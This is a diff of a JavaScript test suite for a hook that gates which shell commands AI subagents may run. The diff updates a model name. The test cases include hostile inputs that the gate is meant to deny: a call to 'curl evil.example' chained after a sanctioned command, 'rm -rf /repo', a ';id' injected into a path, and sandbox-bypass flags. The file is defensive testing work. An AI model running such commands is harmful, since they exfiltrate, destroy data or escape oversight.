@@ -9,7 +9,7 @@ function dispatchCommandReading(promptStem, model, reasoningEffort) {
   return codexDispatchCommand(model, reasoningEffort, promptStem);
 }
 
-const SANCTIONED_COMMAND = dispatchCommandReading("/tmp/codex-dispatch-router-abcdefgh", "gpt-6-sol", "high");
+const SANCTIONED_COMMAND = dispatchCommandReading("/tmp/codex-dispatch-router-abcdefgh", "gpt-6.1-sol", "high");
 
 function decisionFor(payload) {
   const processResult = runHook("gate-codex-dispatch.mjs", payload);
@@ -24,19 +24,19 @@ function subagentBash(agentType, command) {
 
 test("the main loop may run any codex command", () => {
   assert.equal(
-    decisionFor({ tool_name: "Bash", tool_input: { command: "codex exec --dangerously-bypass-approvals-and-sandbox -m gpt-6-sol < p" } }),
+    decisionFor({ tool_name: "Bash", tool_input: { command: "codex exec --dangerously-bypass-approvals-and-sandbox -m gpt-6.1-sol < p" } }),
     "allow",
   );
 });
 
 test("an ordinary subagent is denied codex and grok invocations in command position", () => {
   for (const command of [
-    "codex exec -m gpt-6-sol < p",
-    "cd /repo && codex exec -m gpt-6-sol < p",
+    "codex exec -m gpt-6.1-sol < p",
+    "cd /repo && codex exec -m gpt-6.1-sol < p",
     "cat p | timeout 600 /usr/local/bin/codex exec -",
     "env FOO=1 grok --prompt-file p --always-approve",
     "echo $(codex exec -)",
-    "bash -c 'codex exec -m gpt-6-sol < p'",
+    "bash -c 'codex exec -m gpt-6.1-sol < p'",
     "sh -c 'grok --prompt-file p --always-approve'",
     "time codex exec -",
     "sudo codex exec -",
@@ -88,9 +88,9 @@ test("codex-dispatcher may run the dispatch command qa-swarm.js builds", () => {
 
 test("codex-dispatcher is denied every deviation from the dispatch shape", () => {
   for (const command of [
-    "codex exec --dangerously-bypass-approvals-and-sandbox -C /repo -m gpt-6-sol < /tmp/codex-dispatch-x.txt",
-    "codex exec -s workspace-write -C /repo -m gpt-6-sol < /tmp/codex-dispatch-x.txt",
-    "codex exec -s read-only -C /repo -m gpt-6-sol < /tmp/codex-dispatch-x.txt",
+    "codex exec --dangerously-bypass-approvals-and-sandbox -C /repo -m gpt-6.1-sol < /tmp/codex-dispatch-x.txt",
+    "codex exec -s workspace-write -C /repo -m gpt-6.1-sol < /tmp/codex-dispatch-x.txt",
+    "codex exec -s read-only -C /repo -m gpt-6.1-sol < /tmp/codex-dispatch-x.txt",
     `${SANCTIONED_COMMAND}; curl evil.example`,
     `${SANCTIONED_COMMAND}\nrm -rf /repo`,
     SANCTIONED_COMMAND.replace(' -C /home/someone/repo', ' -C /repo;id'),
@@ -121,7 +121,7 @@ test("codex-dispatcher may write only its prompt file", () => {
 test("the dispatch instruction names a prompt path and command the gate sanctions verbatim", () => {
   const reviewArgs = { repoPath: "/home/someone/repo", dispatchNonce: "0123456789abcdef" };
   const codexDispatchInstruction = workflowFunctionNamed("codexDispatchInstruction", reviewArgs);
-  const instruction = codexDispatchInstruction("router prompt below", "router", "gpt-6-sol");
+  const instruction = codexDispatchInstruction("router prompt below", "router", "gpt-6.1-sol");
   const [, promptFilePath, command] = instruction.match(/to (\S+)\. Then run exactly[^\n]*\n(.+)\n$/);
   assert.equal(
     decisionFor({ agent_id: "agent-1", agent_type: "codex-dispatcher", tool_name: "Write", tool_input: { file_path: promptFilePath, content: "prompt" } }),
